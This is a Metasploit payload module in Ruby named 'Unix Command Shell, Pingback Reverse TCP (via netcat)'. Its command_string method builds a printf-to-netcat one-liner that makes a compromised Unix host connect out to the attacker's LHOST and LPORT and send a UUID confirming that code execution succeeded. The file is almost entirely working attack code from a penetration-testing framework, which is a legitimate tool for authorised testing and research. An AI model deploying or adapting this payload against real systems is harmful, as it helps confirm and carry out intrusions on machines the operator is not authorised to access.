##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 99

  include Msf::Payload::Single
  include Msf::Payload::Pingback
  include Msf::Payload::Pingback::Options

  def initialize(info = {})
    super(merge_info(info,
     'Name'          => 'Unix Command Shell, Pingback Reverse TCP (via netcat)',
     'Description'   => 'Creates a socket, send a UUID, then exit',
     'Author'        =>
       [
         'asoto-r7'
       ],
     'License'       => MSF_LICENSE,
     'Platform'      => 'unix',
     'Arch'          => ARCH_CMD,
     'Handler'       => Msf::Handler::ReverseTcp,
     'Session'       => Msf::Sessions::Pingback,
     'PayloadType'   => 'cmd',
     'RequiredCmd'   => 'netcat'
    ))
    register_advanced_options(
      [
        OptString.new('NetcatPath', [true, 'The path to the Netcat executable', 'nc'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    super.to_s + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    self.pingback_uuid ||= self.generate_pingback_uuid
    "printf '#{pingback_uuid.scan(/../).map { |x| "\\x" + x }.join}' | #{datastore['NetcatPath']} #{datastore['LHOST']} #{datastore['LPORT']}"
  end
end
